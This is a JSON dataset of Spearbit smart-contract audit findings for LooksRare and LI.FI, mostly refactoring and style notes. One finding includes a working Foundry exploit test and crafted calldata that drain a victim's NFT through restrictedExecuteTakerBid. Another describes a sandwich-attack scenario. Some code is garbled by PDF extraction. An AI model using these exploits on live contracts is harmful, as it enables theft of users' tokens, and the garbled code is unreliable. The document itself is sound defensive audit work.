advantage of the parameter type mismatch to create a malicious payload (address, address, address, uint256[], uint256[] ) that when decoded as (address[], address[], address, address, uint256[][], uint256[][]) It would allow them to transfer any NFT tokens from any user to some specific users. ; interpreted paramters | original parameter ,! ; ---------------------------------- ,! -------- c Ma.s or msg.sender 00000000000000000000000000000000000000000000000000000000000000c0 ; collections.ptr 0000000000000000000000000000000000000000000000000000000000000100 ; assetTypes.ptr ,! 00000000000000000000000000000000000000000000000000000000000000X3 ; from ,! 00000000000000000000000000000000000000000000000000000000000000X4 ; to ,! itemIds.ptr -> 0xa0 Tb.r or Mb.s x 0000000000000000000000000000000000000000000000000000000000000140 ; itemIds.ptr ,! amounts.ptr -> 0xc0 + 0x20 * itemIds.length 00000000000000000000000000000000000000000000000000000000000001c0 ; amounts.ptr ,! itemIds.length | collection | from / | to / | | | ; ; | itemIds[0] | itemIds[1] ... Fortunately, that is not possible since in this particular instance the transferItemsERC721 and transferItem- sERC1155's amounts's calldata tail pointer always coincide with transferBatchItemsAcrossCollections's itemIds's calldata tail pointer (uint256[] amounts, uint256[][] itemIds) which unless both have length 0 it would cause the compiled code to revert due to out of range index access. This is also dependent on if/how the compiler encodes/decodes the calldata and if the compiler would add the bytecodes for the deployed code to revert for OOR accesses (which solc does). This is just a lucky coincidence otherwise, OT could have exploited this flaw.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Shared login in different StrategyFloorFromChainlink strategies can be refactored", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid.  executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCol- lectionOfferStrategyWithTakerAsk. Each group of endpoints in the above list share the exact same logic. The only difference they have is the formula and checks used to calculate the desiredPrice based on a given floorPrice and premium/discount. function a1(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a1(<INTER_PARAMS>); // inlined computation of _a1 <POST_COMMON_BLOCK> } function a2(<INPUT_PARAMS>) external view returns (<OUTPUT_PARAMS>) { <PRE_COMMON_BLOCK> (<OUTER_PARAMS>) = _a2(<INTER_PARAMS>); // inlined computation of _a2 <POST_COMMON_BLOCK> }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Setting protocol and ask fee amounts and recipients can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Setting and calculating the protocol and ask fee amounts and recipients follow the same logic in _executeStrategyForTakerAsk and _executeStrategyForTakerBid.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Creator fee amount and recipient calculation can be refactored in ExecutionManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The create fee amount and recipient calculation in _executeStrategyForTakerAsk and _executeS- trategyForTakerBid are identical and can be refactored.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The owner can set the selector for a strategy to any bytes4 value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The owner can set the selector for a strategy to any bytes4 value (as long as it's not bytes4(0)). Even though the following check exists if (!IBaseStrategy(implementation).isLooksRareV2Strategy()) { revert NotV2Strategy(); } There is no measure taken to avoid potential selector collision with other contract types.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Constraints among the number of item ids and amounts for taker or maker bids or asks are incon- sistent among different strategies. notation description Ti Ta Mi Ma length of taker's bid (or ask depending on the context) item ids length of taker's bid (or ask depending on the context) amounts length of maker's bid (or ask depending on the context) item ids length of maker's bid (or ask depending on the context) amounts 59  IneheritedStategy : Ti = Ta = Mi = Ma  StrategyItemIdsRange : Ti (cid:20) Ta, Mi = 2, Ma = 1 (related issue)  StrategyDutchAuction : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyUSDDynamicAsk: Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma  StrategyFloorFromChainlink.execute...PremiumStrategyWithTakerBid : Mi (cid:20) Ti , Ma (cid:20) Ta, Mi = Ma = 1  StrategyFloorFromChainlink.execute...DiscountCollectionOfferStrategyWithTakerAsk : Ti = 1, 1 = Ta, Ma = 1  StrategyCollectionOffer : Ti = 1, 1 (cid:20) Ta, Ma = 1 The equalities above are explicitly enforced, but the inequalities are implicitly enforced through the compiler's out-of-bound revert. Note that in most cases (except StrategyItemIdsRange) one can enforce Ti = Ta = Mi = Ma and refactor this logic into a utility function.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Requirements/checks for adding new transfer managers (or strategies) are really important to avoid self-reentrancy through restrictedExecuteTakerBid from unexpected call sites", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "When a new transfer manager gets added to the protocol, there is a check to make sure that this manager cannot be the protocol itself. This is really important as restrictedExecuteTakerBid allows the protocol itself to call this endpoint. If the check below was omitted: if ( transferManagerForAssetType == address(0) || // transferManagerForAssetType == address(this) || selectorForAssetType == bytes4(0) ) { } revert ManagerSelectorEmpty(); The owner can add the protocol itself as a transfer manager for a new asset type and pick the selector to be ILooksRareProtocol.restrictedExecuteTakerBid.selector. Then the owner along with a special address can collude and drain users' NFT tokens from an actual approved transfer manager for ERC721/ERC1155 assets. The special feature of restrictedExecuteTakerBid is that once it's called the provided parameters by the maker are not checked/verified against any signatures. The PoC below includes 2 different custom strategies for an easier setup but they are not necessary (one can use the default strategy). One creates the calldata payload and the other is called later on to select a desired NFT token id. 60 The calldata to restrictedExecuteTakerBid(...) is crafted so that the corresponding desired parameters for an actual transferManager.call can be set by itemIds; parameters offset ,! ------------------------------------------------------------------------------------------------------- c ,! 0x0000 interpreted parameters ---------- | original msg.sender, , can be changed by stuffing 0s 0000000000000000000000000000000000000000000000000000000000000080 0000000000000000000000000000000000000000000000000000000000000180 ,! 00000000000000000000000000000000000000000000000000000000000000X1 ; sender ,! 00000000000000000000000000000000000000000000000000000000000000a0 ,! msg.sender / signer ho, orderHash, 0xa0 | collection | signer / | Ta.r or | i[] ptr 0x0080 ,! to, can be changed by stuffing 0s 00000000000000000000000000000000000000000000000000000000000000X2 ; Tb.r | a[] ptr , 0x0180 00000000000000000000000000000000000000000000000000000000000000X3 ; Tb.p_max 00000000000000000000000000000000000000000000000000000000000000a0 00000000000000000000000000000000000000000000000000000000000000c0 00000000000000000000000000000000000000000000000000000000000000e0 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 from 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X4 ; sid 00000000000000000000000000000000000000000000000000000000000000X5 ; t 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000000X6 ; T 00000000000000000000000000000000000000000000000000000000000000X7 ; C 00000000000000000000000000000000000000000000000000000000000000X8 ; signer ,! 00000000000000000000000000000000000000000000000000000000000000X9 ; ts 00000000000000000000000000000000000000000000000000000000000000Xa ; te 0000000000000000000000000000000000000000000000000000000000000000 00000000000000000000000000000000000000000000000000000000000001c0 00000000000000000000000000000000000000000000000000000000000001e0 0000000000000000000000000000000000000000000000000000000000000200 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000000000000 | i[].len | i[0] | i[1] | i[2] | i[3] | i[4] | i[5] | i[6] | i[7] | i[8] | i[9] | i[10] | i[11] | i[12] | i[13] , | i[14] | i[15] | i[16] | i[17] | i[18] | i[19] | i[20] | i[21] | i[22] ; T = real_collection ; C = currency ; t = assetType ; sid = strategyId ; ts = startTime ; te = endTime ; Ta = takerAsk ; Tb = takerBid // file: test/foundry/AssetAttack.t.sol pragma solidity 0.8.17; import {IStrategyManager} from \"../../contracts/interfaces/IStrategyManager.sol\"; import {IBaseStrategy} from \"../../contracts/interfaces/IBaseStrategy.sol\"; import {OrderStructs} from \"../../contracts/libraries/OrderStructs.sol\"; import {ProtocolBase} from \"./ProtocolBase.t.sol\"; import {MockERC20} from \"../mock/MockERC20.sol\"; 61 interface IERC1271 { function isValidSignature( bytes32 digest, bytes calldata signature ) external returns (bytes4 magicValue); } contract PayloadStrategy is IBaseStrategy { address private owner; address private collection; address private currency; uint256 private assetType; address private signer; uint256 private nextStartegyId; constructor() { owner = msg.sender; } function set( address _collection, address _currency, uint256 _assetType, address _signer, uint256 _nextStartegyId ) external { if(msg.sender != owner) revert(); collection = _collection; currency = _currency; assetType = _assetType; signer = _signer; nextStartegyId = _nextStartegyId; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ ) external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) { itemIds = new uint256[](23); itemIds[0] = 0xa0; itemIds[1] = 0xc0; itemIds[2] = 0xe0; 62 itemIds[8] = nextStartegyId; itemIds[9] = assetType; itemIds[11] = uint256(uint160(collection)); itemIds[12] = uint256(uint160(currency)); itemIds[13] = uint256(uint160(signer)); itemIds[14] = 0; // startTime itemIds[15] = type(uint256).max; // endTime itemIds[17] = 0x01c0; itemIds[18] = 0x01e0; itemIds[19] = 0x0200; } } contract ItemSelectorStrategy is IBaseStrategy { address private owner; uint256 private itemId; uint256 private amount; constructor() { owner = msg.sender; } function set( uint256 _itemId, uint256 _amount ) external { if(msg.sender != owner) revert(); itemId = _itemId; amount = _amount; } function isLooksRareV2Strategy() external pure override returns (bool) { return true; } function execute( OrderStructs.TakerBid calldata /* takerBid */ , OrderStructs.MakerAsk calldata /* makerAsk */ external view returns ( uint256 price, uint256[] memory itemIds, uint256[] memory amounts, bool isNonceInvalidated ) itemIds = new uint256[](1); itemIds[0] = itemId; amounts = new uint256[](1); amounts[0] = amount; ) { } } contract AttackTest is ProtocolBase { PayloadStrategy private payloadStrategy; 63 ItemSelectorStrategy private itemSelectorStrategy; MockERC20 private mockERC20; // // can be an arbitrary address uint256 private signingOwnerPK = 42; address private signingOwner = vm.addr(signingOwnerPK); // this address will define an offset in the calldata // and can be changed up to a certain upperbound by // stuffing calldata with 0s. address private specialUser1 = address(0x180); // NFT token recipient of the attack can also be changed // up to a certain upper bound by stuffing the calldata with 0s address private specialUser2 = address(0x3a0); // can be an arbitrary address address private victimUser = address(505); function setUp() public override { super.setUp(); vm.startPrank(_owner); { looksRareProtocol.initiateOwnershipTransfer(signingOwner); } vm.stopPrank(); vm.startPrank(signingOwner); { looksRareProtocol.confirmOwnershipTransfer(); mockERC20 = new MockERC20(); looksRareProtocol.updateCurrencyWhitelistStatus(address(mockERC20), true); looksRareProtocol.updateCreatorFeeManager(address(0)); mockERC20.mint(victimUser, 1000); mockERC721.mint(victimUser, 1); // This particular strategy is not a requirement of the exploit. // it just makes it easier payloadStrategy = new PayloadStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, PayloadStrategy.execute.selector, true, address(payloadStrategy) ); itemSelectorStrategy = new ItemSelectorStrategy(); looksRareProtocol.addStrategy( 0, 0, 0, ItemSelectorStrategy.execute.selector, false, address(itemSelectorStrategy) ); } 64 vm.stopPrank(); _setUpUser(victimUser); } function testAttack() public { vm.startPrank(signingOwner); looksRareProtocol.addTransferManagerForAssetType( 2, address(looksRareProtocol), looksRareProtocol.restrictedExecuteTakerBid.selector ); payloadStrategy.set( address(mockERC721), address(mockERC20), 0, victimUser, 2 // itemSelectorStrategy ID ); itemSelectorStrategy.set(1, 1); OrderStructs.MakerBid memory makerBid = _createSingleItemMakerBidOrder({ // payloadStrategy bidNonce: 0, subsetNonce: 0, strategyId: 1, assetType: 2, // LooksRareProtocol itself orderNonce: 0, collection: address(0x80), // calldata offset currency: address(mockERC20), signer: signingOwner, maxPrice: 0, itemId: 1 }); bytes memory signature = _signMakerBid(makerBid, signingOwnerPK); OrderStructs.TakerAsk memory takerAsk; vm.stopPrank(); vm.prank(specialUser1); looksRareProtocol.executeTakerAsk( takerAsk, makerBid, signature, _EMPTY_MERKLE_TREE, _EMPTY_AFFILIATE ); assertEq(mockERC721.balanceOf(victimUser), 0); assertEq(mockERC721.ownerOf(1), specialUser2); } }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "viewCreatorFeeInfo can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "viewCreatorFeeInfo includes a low-level staticcall to collection's royaltyInfo endpoint and later its return status is compared and the return data is decoded.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_verifyMerkleProofOrOrderHash can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_verifyMerkleProofOrOrderHash includes a if/else block that calls into _computeDigestAndVer- ify with almost the same inputs (only the hash is different).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "isOperatorValidForTransfer can be modified to refactor more of the logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "isOperatorValidForTransfer is only used to revert if necessary. The logic around the revert decision on all call sites.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep maximum allowed number of characters per line to 120.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There are a few long lines in the code base. contracts/executionStrategies/StrategyCollectionOffer.sol 21:2 27:2 29:2 30:2 67:2 69:2 70:2 118:2 119:2 error error error error error error error error error Line length must be no more than 120 but current length is 127 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length max-line-length contracts/executionStrategies/StrategyDutchAuction.sol 20:2 22:2 23:2 26:5 70:31 85:2 86:2 92:5 error error error warning warning error error warning Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 9 but allowed no more than 7 Avoid to make time-based decisions in your business logic Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 8 but allowed no more than 7 max-line-length max-line-length max-line-length code-complexity not-rely-on-time max-line-length max-line-length code-complexity contracts/executionStrategies/StrategyItemIdsRange.sol 15:2 20:2 21:2 22:2 23:2 25:5 100:2 101:2 error error error error error warning error error Line length must be no more than 120 but current length is 142 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 163 Line length must be no more than 120 but current length is 121 Line length must be no more than 120 but current length is 121 Function has cyclomatic complexity 12 but allowed no more than 7 Line length must be no more than 120 but current length is 123 Line length must be no more than 120 but current length is 121 max-line-length max-line-length max-line-length max-line-length max-line-length code-complexity max-line-length max-line-length contracts/helpers/OrderValidatorV2A.sol 40:2 ,! 53:2 ,! error Line length must be no more than 120 but current length is 121 error Line length must be no more than 120 but current length is 121 max-line-length max-line-length 69 225:2 ,! 279:2 ,! 498:24 ,! 501:26 ,! 511:2 ,! 593:5 ,! 662:5 ,! 758:5 ,! 830:5 ,! 843:17 ,! 850:17 ,! 906:5 ,! 963:5 ,! 12:2 ,! 18:2 ,! 23:2 ,! 49:5 ,! 81:2 ,! 144:2 ,! error Line length must be no more than 120 but current length is 127 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Avoid to make time-based decisions in your business logic not-rely-on-time warning Avoid to make time-based decisions in your business logic not-rely-on-time error Line length must be no more than 120 but current length is 143 max-line-length warning Function has cyclomatic complexity 9 but allowed no more than 7 warning Function has cyclomatic complexity 9 but allowed no more than 7 code-complexity code-complexity warning Function order is incorrect, internal view function can not go after internal pure function (line 727) ordering warning Function has cyclomatic complexity 10 but allowed no more than 7 code-complexity warning Avoid to use inline assembly. It is acceptable only in rare cases no-inline-assembly warning Avoid to use inline assembly. It is acceptable only in rare cases warning Function has cyclomatic complexity 8 but allowed no more than 7 no-inline-assembly code-complexity warning Function has cyclomatic complexity 8 but allowed no more than 7 code-complexity contracts/helpers/ValidationCodeConstants.sol 17:2 18:2 error error Line length must be no more than 120 but current length is 129 Line length must be no more than 120 but current length is 121 max-line-length max-line-length contracts/interfaces/ILooksRareProtocol.sol 160:2 error Line length must be no more than 120 but current length is 122 max-line-length contracts/libraries/OrderStructs.sol error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 292 max-line-length error Line length must be no more than 120 but current length is 127 max-line-length warning Function order is incorrect, struct definition can not go after state variable declaration (line 26) ordering error Line length must be no more than 120 but current length is 128 max-line-length error Line length must be no more than 120 but current length is 131 max-line-length 49 problems (34 errors, 15 warnings)", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "avoid transferring in _transferFungibleTokens when sender and recipient are equal", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Currently, there is no check in _transferFungibleTokens to avoid transferring funds from sender to recipient when they are equal. There is only one check outside of _transferFungibleTokens when one wants to transfer to an affiliate. But if the bidUser is the creator, or the ask recipient or the protocolFeeRecipient, the check is missing.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Keep the order of parameters consistent in updateStrategy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In updateStrategy, isActive is set first when updating storage, and it's the second parameter when supplied to the StrategyUpdated event. But it is the last parameter supplied to updateStrategy.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "_transferFungibleTokens does not check whether the amount is 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "_transferFungibleTokens does not check whether amount is 0 to skip transferring to recipient. For the ask recipient and creator amounts the check is performed just before calling this function. But the check is missing for the affiliate and protocol fees.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "StrategyItemIdsRange.executeStrategyWithTakerAsk - Maker's bid amount might be entirely ful- filled by a single ERC1155 item", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "StrategyItemIdsRange allows a buyer to specify a range of potential item ids (both ERC721 and ERC1155) and a desired amount, then a seller can match the buyer's request by picking a subset of items from the provided range so that the desired amount of items are eventually fulfilled. a taker might pick a single ERC1155 item id from the range and fulfill the entire order with multiple instances of that same item.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Define named constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": " ExecutionManager.sol#L289 : 0x7476320f is cast sig \"OutsideOfTimeRange()\"  TransferSelectorNFT.sol#L30 : 0xa7bc96d3 is cast sig \"transferItemsERC721(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC721.selector  TransferSelectorNFT.sol#L31 : 0xa0a406c6 is cast sig \"transferItemsERC1155(address,address,address,uint256[],uint256[])\" and can be replaced by TransferManager.transferItemsERC1155.selector.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "price validation in executeStrategyWithTakerAsk, executeCollectionStrategyWithTakerAsk and executeCollectionStrategyWithTakerAskWithProof can be relaxed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the above context, a maker is bidding a maximum price pmax and a taker is asking a minimum price pmin, the strategy should calculate a price p in the range [pmin, pmax ] and so we would need to have pmin (cid:20) pmax . The above strategies pick the execution price to be pmax (the maximum price bid by the maker), and since the taker is the caller to the protocol we would only need to require pmin (cid:20) pmax . But the current requirement is pmin = pmax . if ( ... || makerBid.maxPrice != takerAsk.minPrice) { revert OrderInvalid(); }", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Change occurances of whitelist to allowlist and blacklist to blocklist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the codebase, whitelist (blacklist) is used to represent entities or objects that are allowed (denied) to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Add more documentation on expected priceFeed decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "The Chainlink strategies are making the following assumptions 1. All priceFeeds in StrategyFloorFromChainlink have a decimals value of 18. 2. The priceFeed in StrategyUSDDynamicAsk has a decimals value of 8. Any priceFeed that is added that does not match these assumptions would lead to incorrect calculations.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Code duplicates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "* In some places, Chainlink staleness is checked using block.timestamp - updatedAt > maxLa- tency, and in other places it is checked using block.timestamp > maxLatency + updatedAt. Consider refactor- ing this code into a helper function. Otherwise, it would be better to use only one version of the two code snippets across the protocol.  The validation check to match assetType with the actual amount of items being transferred is duplicated among the different strategies instead of being implemented at a higher level once, such as in a common function or class that can be reused among the different strategies.  _executeStrategyForTakerAsk and _executeStrategyForTakerBid almost share the same code.  TakerBid, TakerAsk can be merged into a single struct.  MakerBid, MakerAsk can be merged into a single struct.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Low level calls are not recommended as they lack type safety and won't revert for calls to EOAs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Low-level calls are not recommended for interaction between different smart contracts in modern versions of the compiler, mainly because they lack type safety, return data size checks, and won't revert for calls to Externally Owned Accounts.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Insufficient input validation of orders (especially on the Taker's side)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "There is a lack of consistency in the validation of parameters, as some fields of the taker's order are checked against the maker's order while others are not. It is worth noting that we have not identified any significant impact caused by this issue.  Missing validation of strategyId  Missing validation of collection  Most strategies only validate length mismatches on one side of the order. Also, they don't usually validate that the lengths match between both sides. For example, in the DutchAuction strategy, if the makerAsk has itemIds and amounts arrays of length 2 and 2, then it would be perfectly valid for the takerBid to use itemIds and amounts arrays of length 5 and 7, as long as the first two elements of both arrays match what is expected. (FYI: I filed a related issue for the ItemIdsRange strategy, which I think is more severe of an issue because the mismatched lengths can actually be returned from the function).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "LooksRareProtocol's owner can take maker's tokens for signed orders with unimplemented strat- egyIds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "If a maker signs an order that uses a strategyId that hasn't been added to the protocol yet, the protocol owner can add a malicious strategy afterward such that a taker would be able to provide no fulfillment but take all the offers.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Strategies with faulty price feeds can have unwanted consequences", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In LooksRare protocol once a strategy has been added its implementation and selector cannot be updated. This is a good since users who sign their MakerBid or MakerAsk can trustlessly examine the strategy implementation before including them into their orders. Some strategies might depend on other actors such as price feeds. This is the case for StrategyUSDDynamicAsk and StrategyFloorFromChainlink. If for some reason these price feeds do not return the correct prices, these strategies can have a slight deviation from their original intent. Case StrategyUSDDynamicAsk If the price feed returns a lower price, a taker can bid on an order with that lower price. This scenario is guarded by MakerAsk's minimum price. But the maker would not receive the expected amount if the correct price was reported and was greater than the maker's minimum ask. Case StrategyFloorFromChainlink For executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCollec- tionOfferStrategyWithTakerAsk if the price feeds reports a floor price higher than the maker's maximum bid price, the taker can match with the maximum bid. Thus the maker ends up paying more than the actual floor adjusted by the discount formula. For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid if the price feeds report a floor price lower than the maker's minimum ask price, the taker can match with the minimum ask price and pay less than the actual floor price (adjusted by the premium).", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "The provided price to IERC2981.royaltyInfo does not match the specifications", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "royaltyFeeRegistry.royaltyInfo does not return a non-zero creator address, we check whether the collection supports IERC2981 and if it does, we loop over each itemId and call the collection's royaltyInfo endpoint. But the input price parameters provided to this endpoint do not match the specification of EIP-2981: CreatorFeeManagerWithRoyalties, CreatorFeeManagerWithRebates and /// @param _salePrice - the sale price of the NFT asset specified by _tokenId 78 The price provided in viewCreatorFeeInfo functions, is the price for the whole batch of itemIds and not the individual tokens itemIds[i] provided to the royaltyInfo endpoint. Even if the return values (newCreator, newCreatorFee) would all match, it would not mean that newCreatorFee should be used as the royalty for the whole batch. An example is that if the royalty is not percentage-based, but a fixed price.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Replace the abi.encodeWithSelector with abi.encodeCall to ensure type and typo safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "In the context above, abi.encodeWithSelector is used to create the call data for a call to an external contract. This function does not guarantee that mismatched types are used for the input parameters.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Use the inline keccak256 with the formatting suggested when defining a named constant for an EIP-712 type hash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf", "body": "Hardcoded byte32 EIP-712 type hashes are defined in the OrderStructs library.", "labels": ["Spearbit", "LooksRare", "Severity: Informational"]}, {"title": "Hardcode bridge addresses via immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "Most bridge facets call bridge contracts where the bridge address has been supplied as a parameter. This is inherently unsafe because any address could be called. Luckily, the called function signature is hardcoded, which reduces risk. However, it is still possible to call an unexpected function due to the potential collisions of function signatures. Users might be tricked into signing a transaction for the LiFi protocol that calls unexpected contracts. One exception is the AxelarFacet which sets the bridge addresses in initAxelar(), however this is relatively expensive as it requires an SLOAD to retrieve the bridge addresses. Note: also see \"Facets approve arbitrary addresses for ERC20 tokens\". function startBridgeTokensViaOmniBridge(..., BridgeData calldata _bridgeData) ... { ... _startBridge(_lifiData, _bridgeData, _bridgeData.amount, false); } function _startBridge(..., BridgeData calldata _bridgeData, ...) ... { IOmniBridge bridge = IOmniBridge(_bridgeData.bridge); if (LibAsset.isNativeAsset(_bridgeData.assetId)) { bridge.wrapAndRelayTokens{ ... }(...); } else { ... bridge.relayTokens(...); } ... } contract AxelarFacet { function initAxelar(address _gateway, address _gasReceiver) external { ... s.gateway = IAxelarGateway(_gateway); s.gasReceiver = IAxelarGasService(_gasReceiver); } function executeCallViaAxelar(...) ... { ... s.gasReceiver.payNativeGasForContractCall{ ... }(...); s.gateway.callContract(destinationChain, destinationAddress, payload); } }", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Tokens are left in the protocol when the swap at the destination chain fails", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "LiFi protocol finds the best bridge route for users. In some cases, it helps users do a swap at the destination chain. With the help of the bridge protocols, LiFi protocol helps users trigger swapAndComplete- BridgeTokensVia{Services} or CompleteBridgeTokensVia{Services} at the destination chain to do the swap. Some bridge services will send the tokens directly to the receiver address when the execution fails. For example, Stargate, Amarok and NXTP do the external call in a try-catch clause and send the tokens directly to the receiver If the receiver is the Executor contract, when it fails. The tokens will stay in the LiFi protocols in this scenario. users can freely pull the tokens. Note: Exploiters can pull the tokens from LiFi protocol, Please refer to the issue Remaining tokens can be sweeped from the LiFi Diamond or the Executor , Issue #82 Exploiters can take a more aggressive strategy and force the victims swap to revert. A possible exploit scenario:  A victim wants to swap 10K optimisms BTC into Ethereum mainnet USDC.  Since dexs on mainnet have the best liquidity, LiFi protocol helps users to the swap on mainnet  The transaction on the source chain (optimism) suceed and the Bridge services try to call Complete- BridgeTokensVia{Services} on mainnet.  The exploiter builds a sandwich attack to pump the BTC price. The CompleteBridgeTokens fails since the price is bad.  The bridge service does not revert the whole transaction. Instead, it sends the BTC on the mainnet to the receiver (LiFi protocol).  The exploiter pulls tokens from the LiFi protocol.", "labels": ["Spearbit", "LIFI", "Severity: High Risk"]}, {"title": "Tokens transferred with Axelar can get lost if the destination transaction cant be executed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf", "body": "If _executeWithToken() reverts then the transaction can be retried, possibly with additional gas. See axelar recovery. However there is no option to return the tokens or send them elsewhere. This means that tokens would be lost if the call cannot be made to work. contract Executor is IAxelarExecutable, Ownable, 